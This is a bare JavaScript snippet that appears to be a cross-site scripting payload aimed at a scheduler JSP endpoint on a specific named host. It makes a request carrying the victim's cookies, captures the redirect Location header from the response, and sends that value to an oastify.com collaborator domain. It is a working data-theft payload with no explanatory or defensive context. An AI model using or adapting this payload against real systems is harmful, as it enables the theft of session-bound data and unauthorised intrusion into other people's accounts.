(function(){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxx&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include',redirect:'manual'})
.then(r=>{
let loc=r.headers.get('Location');
if(loc) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?loc='+encodeURIComponent(loc),{mode:'no-cors'});
});
})();
